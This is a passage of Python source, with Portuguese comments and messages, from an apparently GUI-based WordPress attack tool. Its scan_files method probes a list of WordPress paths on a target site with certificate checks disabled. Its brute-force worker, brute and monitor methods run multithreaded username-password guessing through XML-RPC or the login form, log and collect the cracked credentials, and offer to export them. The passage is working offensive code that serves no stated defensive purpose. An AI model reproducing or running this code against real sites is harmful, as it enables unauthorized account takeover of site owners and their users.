    # ---------- Scan de arquivos ----------
    def scan_files(self):
        base = self.url.get().strip().rstrip("/")
        self.log(f"\n[*] Varredura de arquivos em: {base} ({len(WORDPRESS_PATHS)} caminhos)\n")

        def run():
            resultados = []
            for p in WORDPRESS_PATHS:
                url = f"{base}/{p}"
                try:
                    r = requests.get(url, headers=UA, timeout=10, verify=False)
                    if r.status_code == 200:
                        self.log(f"[200] {url}")
                        resultados.append((url, r.status_code))
                except Exception:
                    pass
            with self.lock:
                self.scan_results = resultados
            self.log(f"\n[*] Varredura concluída. {len(resultados)} arquivos encontrados (200).\n")
            self.log("[*] Use o botão '3) Salvar scan em .txt' para exportar.")

        threading.Thread(target=run, daemon=True).start()

    # ---------- Brute force ----------
    def worker(self, q, base, method, total_users):
        while not self.stop_event.is_set() and not q.empty():
            try:
                user, pwd = q.get_nowait()
            except queue.Empty:
                break
            try:
                with self.lock:
                    if user in self.found_users:
                        continue
                self.log(f"[*] Testando usuario = {user:<15} senha = {pwd}", "cyan")
                if method == "xmlrpc":
                    ok = bf_xmlrpc(base, user, pwd)
                    if ok:
                        with self.lock:
                            self.found.append((user, pwd))
                            self.found_users.add(user)
                            restantes = total_users - len(self.found_users)
                        self.log(f"!!! SUCESSO (XMLRPC): usuario = {user:<15} senha = {pwd}", "orange")
                        if restantes <= 0:
                            self.log("✅ TODOS os usuários quebrados! Parando...", "orange")
                            self.stop_event.set()
                            break
                else:
                    ok = bf_login(base, user, pwd, self.found, self.log)
                    if ok:
                        with self.lock:
                            self.found_users.add(user)
                            restantes = total_users - len(self.found_users)
                        if restantes <= 0:
                            self.log("✅ TODOS os usuários quebrados! Parando", "red")
                            self.stop_event.set()
                            break
                if not ok and not self.stop_event.is_set():
                    self.log(f"[-] Falha: {user}:{pwd}")
            except Exception as e:
                self.log(f"[!] Erro {user}: {e}", "red")
            finally:
                q.task_done()

    def brute(self):
        base = self.url.get().strip().rstrip("/")
        wl_path = self.wl.get().strip()
        users = [u.strip() for u in self.users.get("1.0", "end").splitlines() if u.strip()]
        if not users:
            messagebox.showerror("Erro", "Informe ou carregue uma wordlist de usuários primeiro.")
            return
        users = list(dict.fromkeys(users))
        try:
            with open(wl_path, "r", encoding="utf-8", errors="ignore") as f:
                words = [w.strip() for w in f if w.strip()]
        except Exception:
            messagebox.showerror("Erro", "Wordlist inválida ou não encontrada.")
            return
        if not words:
            messagebox.showerror("Erro", "A wordlist de senhas está vazia.")
            return
        try:
            n = int(self.threads_v.get())
        except ValueError:
            n = 5

        q = queue.Queue()
        for u, p in itertools.product(users, words):
            q.put((u, p))

        self.found.clear()
        self.found_users.clear()
        self.stop_event.clear()

        self.log(f"\n🔥 Brute force iniciado: {len(users)} usuários x {len(words)} senhas = {q.qsize()} tentativas ({n} threads)\n")
        self.log(f"[*] Alvo: {base} — usuários: {', '.join(users)}\n\n", "cyan")

        for _ in range(n):
            threading.Thread(target=self.worker, args=(q, base, self.method.get(), len(users)), daemon=True).start()

        def monitor():
            q.join()
            if not self.stop_event.is_set():
                if self.found:
                    self.log("[*] Fila finalizada. Usuários quebrados:", "orange")
                    for u, p in self.found:
                        self.log(f"    ✅ {u} : {p}", "orange")
                    nao = [u for u in users if u not in self.found_users]
                    if nao:
                        self.log(f"[-] Sem senha encontrada para: {', '.join(nao)}", "red")
                else:
                    self.log("[-] Nenhuma credencial encontrada.", "red")
            self.log("[*] Brute force finalizado. Use o botão 'Salvar senhas em .txt' para exportar.")

        threading.Thread(target=monitor, daemon=True).start()

